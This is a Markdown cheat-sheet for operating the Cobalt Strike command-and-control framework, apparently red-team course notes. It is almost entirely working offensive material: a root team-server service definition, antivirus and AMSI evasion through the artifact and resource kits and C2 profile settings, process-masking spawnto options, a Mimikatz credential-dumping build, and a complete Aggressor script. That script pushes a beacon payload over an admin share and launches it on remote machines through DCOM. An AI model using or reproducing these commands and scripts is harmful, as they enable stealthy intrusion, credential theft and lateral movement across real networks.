# Cobalt Strike Cheat-Sheet

### TeamServer service
```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```

## Commands

### Bypass CLM
```
powerpick <PS COMMAND>
```

## Kits

### On-disk detections (artifact kit)
* Obfuscate EXEs and DLLs
```
 ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts
```

### In-Memory detections (resource kit)
```
./build.sh /mnt/c/Tools/cobaltstrike/resources
```

### AMSI Bypasses
* amsi_disable only applies to powerpick, execute-assembly and psinject.
```
powerpick <PS COMMAND>
```
* C2 Profile
```
post-ex {
        set amsi_disable "true";
}
```
* Check C2 profiles modifications
```
./c2lint c2-profiles/normal/webbug.profile
```

### Behaviour detections
* Change the process that cobaltstrike runs for fork&run
* Within beacon (reset with ```spawnto```)
```
spawnto x64 %windir%\sysnative\notepad.exe
spawnto x86 %windir%\syswow64\notepad.exe
```
* Change psexec spawn process
```
ak-settings spawnto_x64 C:\Windows\System32\notepad.exe
ak-settings spawnto_x86 C:\Windows\System32\notepad.exe
```
* Edit c2-profile
```
post-ex {
        set amsi_disable "true";

        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

### Mimikatz kit (Windows 11 update mimikatz)
```
./build.sh /mnt/c/Tools/cobaltstrike/mimikatz
```

### Invoke-DCOM.cna
```
sub invoke_dcom
{
    local('$handle $script $oneliner $payload');

    # acknowledge this command1
    btask($1, "Tasked Beacon to run " . listener_describe($3) . " on $2 via DCOM", "T1021");

    # read in the script
    $handle = openf(getFileProper("C:\\Tools", "Invoke-DCOM.ps1"));
    $script = readb($handle, -1);
    closef($handle);

    # host the script in Beacon
    $oneliner = beacon_host_script($1, $script);

    # generate stageless payload
    $payload = artifact_payload($3, "exe", "x64");

    # upload to the target
    bupload_raw($1, "\\\\ $+ $2 $+ \\C$\\Windows\\Temp\\beacon.exe", $payload);

    # run via powerpick
    bpowerpick!($1, "Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\Windows\\Temp\\beacon.exe", $oneliner);

    # link if p2p beacon
    beacon_link($1, $2, $3);
}

beacon_remote_exploit_register("dcom", "x64", "Use DCOM to run a Beacon payload", &invoke_dcom);
```
